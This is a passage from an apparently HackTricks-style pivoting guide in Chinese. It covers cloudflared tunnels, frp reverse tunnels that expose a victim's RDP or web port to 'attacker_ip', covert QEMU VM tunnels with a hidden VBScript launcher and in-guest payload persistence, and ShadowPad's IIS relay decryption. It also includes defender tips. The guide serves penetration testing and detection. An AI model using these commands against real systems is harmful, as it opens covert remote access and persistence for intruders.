Cloudflare Tunnel 的 `cloudflared` connector 建立出站连接；已发布的应用可以路由 HTTP、HTTPS、TCP、SSH 和 RDP，而 quick tunnels 用于 HTTP 开发。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 源站（legacy mode）

legacy `--socks5` flag 告诉 `cloudflared` 本地源站使用 SOCKS5；它不会创建本地 SOCKS5 listener。对于 managed tunnel，`originRequest.proxyType: socks` 用于配置 SOCKS5 源站处理。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### 使用 DNS 的持久化隧道

本地管理的隧道配置使用小写的 `tunnel`、`credentials-file` 和 `url` 键，如下所示。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
启动连接器：
```bash
cloudflared tunnel run mytunnel
```
该 connector 建立出站连接，默认协商 QUIC，失败后回退到 HTTP/2；不要假设每个部署都使用 TCP/443。运行它时，仅授予部署所需的权限。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个 Go reverse proxy，支持 **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX 和 XTCP**。XTCP 使用 P2P hole punching，其成功与否取决于 NAT。从 **v0.53.0** 开始，它可以充当 **SSH Tunnel Gateway**，因此目标主机无需 `frpc` binary 即可使用原生 OpenSSH client。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 经典 reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH 网关（无需 frpc 二进制文件）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上述命令使用标准 OpenSSH 客户端，将受害者的 **8080** 端口发布为 **attacker_ip:9000**，同时由 `frps` 提供网关。<sup>[[50]](#references)</sup>

## 使用 QEMU 的隐蔽基于 VM 的 Tunnels

QEMU 用户模式网络不要求为虚拟网络使用 root 或管理员权限，而 `-netdev user,hostfwd=...` 会将来自主机的 TCP、UDP 或 UNIX 连接重定向到 guest。<sup>[[51]](#references)</sup>TrustedSec 记录了一起事件：攻击者使用 Tiny Core QEMU VM 并尝试建立 reverse SSH tunnel，而以主机为重点的 EDR 可能无法发现 guest 内部的活动。<sup>[[1]](#references)</sup>

### 快速单行命令
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上述命令启动了一个具有 256 MiB 客户机内存和 qcow2 磁盘镜像的 **Tiny Core Linux** guest；该磁盘镜像不是 in-RAM 磁盘。
• Windows 主机上的 **2222/tcp** 端口被透明转发到 guest 内部的 **22/tcp**。
• 从攻击者的角度来看，目标仅暴露 2222 端口；所有到达该端口的数据包都由 VM 中运行的 SSH server 处理。

### 通过 VBScript 隐蔽启动

TrustedSec 在上述事件中观察到了由 VBS 驱动的 QEMU 启动以及 Tiny Core 镜像。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
使用 `cscript.exe //B update.vbs` 运行脚本会使窗口保持隐藏。<sup>[[1]](#references)</sup>

### guest 内持久化

所引用的事件描述了如何通过 `/opt/bootlocal.sh` 和 `/opt/filetool.lst`，在无状态 Tiny Core guest 中实现持久化：<sup>[[1]](#references)</sup>

1. 将 payload 放入 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，这样 payload 会在关机时被打包进 `mydata.tgz`。

### Telemetry 注意事项

• host 仍会暴露 QEMU 进程、qcow2 镜像以及任何由 host 转发的 listener。
• 仅针对 host 的进程扫描可能不会检查 guest 进程，但不能保证 virtualization 能够实现规避；网络、QEMU 和镜像 Telemetry 仍可能暴露它。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 提示

• 监控用户可写路径中的**非预期 QEMU/VirtualBox/KVM 二进制文件**。
• 阻止源自 `qemu-system*.exe` 的出站连接。
• 搜索罕见的 listening port（2222、10022、……），尤其是那些在 QEMU 启动后立即进行绑定的端口。

## 通过 `HttpAddUrl` 实现 IIS/HTTP.sys relay nodes（ShadowPad）

Check Point 描述了 ShadowPad 的 IIS module 如何通过 `HttpAddUrl` 绑定 URL 前缀，将被攻陷的边界 web server 转变为 backdoor 和 relay nodes。<sup>[[3]](#references)</sup>

同一份报告详细介绍了下方总结的默认值、wildcard listener、packet decryption、relay queue 和 debug Telemetry。<sup>[[3]](#references)</sup>

* **Config defaults** – 如果 module 的 JSON config 未提供相关值，则会回退到看似正常的 IIS defaults（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）。这样，正常流量会由 IIS 使用正确的品牌标识进行响应。
* **Wildcard interception** – operator 提供以分号分隔的 URL prefix 列表（host + path 中使用 wildcard）。module 会为每个条目调用 `HttpAddUrl`，因此 HTTP.sys 会将匹配的 request 路由到恶意 handler；不匹配的 request 则回退到正常的 IIS 行为。
* **Encrypted first packet** – request body 的前两个字节携带 custom 32-bit PRNG 的 seed。协议解析前，后续每个字节都会与生成的 keystream 进行 XOR：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module 维护两个列表：“servers”（upstream nodes）和“clients”（downstream implants）。如果约 30 秒内没有 heartbeat 到达，条目就会被清理。当两个列表都非空时，它会将第一个 healthy server 与第一个 healthy client 配对，并在双方 socket 之间直接转发字节，直到一方关闭连接。
* **Debug telemetry** – 可选 logging 会记录每个配对的 source IP、destination IP 以及转发字节总数。Investigators 利用这些 breadcrumbs 重建了跨越多个受害者的 ShadowPad mesh。

---

## 需要检查的其他 tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [隐藏于阴影之中：通过 QEMU Virtualization 创建 Covert Tunnels](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 之前：探索 Storm-2603 先前的 Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – 深入 Ink Dragon：揭示 Stealthy Offensive Operation 的 Relay Network 和内部工作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide：绕过 Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：Metasploit 中的 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../banners/hacktricks-training.md}}
